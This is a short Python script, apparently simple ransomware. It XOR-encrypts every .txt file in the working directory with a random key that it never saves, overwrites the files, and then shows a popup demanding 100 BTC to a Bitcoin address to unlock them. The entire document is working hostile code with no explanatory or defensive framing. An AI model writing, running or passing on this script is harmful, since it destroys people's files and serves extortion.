import glob
from random import randint
from tkinter import *
import tkinter.messagebox as TM

key = [randint(0,100)for i in range(3)]

def encrypt(s,k):
	return "".join([chr(ord(s[i]) ^ k[i % len(k)]) for i in range(len(s))])
	
for file in glob.glob("*.txt"):
	f = open(file,"r+")
	data = encrypt(f.read(), key)
	f.close()
	
	g = open(file,"w+")
	g.write(data)
	g.close()

w = Tk()
w.wm_withdraw()
w.geometry("1x1+200+200")
TM.showerror(title="error", 
message="""please send 100 BTC to the following address to unlock files: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh ☺""", 
parent=w)
	